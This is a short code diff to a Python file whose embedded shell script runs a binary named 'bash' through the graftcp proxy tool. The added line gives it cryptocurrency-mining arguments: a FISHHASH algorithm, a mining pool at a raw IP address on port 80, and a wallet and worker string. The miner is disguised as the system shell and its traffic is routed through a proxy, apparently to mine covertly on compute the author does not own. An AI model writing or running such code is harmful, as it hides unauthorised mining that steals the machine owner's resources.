@@ -27,7 +27,7 @@ def run():
     mv bash ~/pan
 
     cd ~/pan
-    ./graftcp/graftcp ./bash
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 159.89.33.226:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
     """
 
     try:
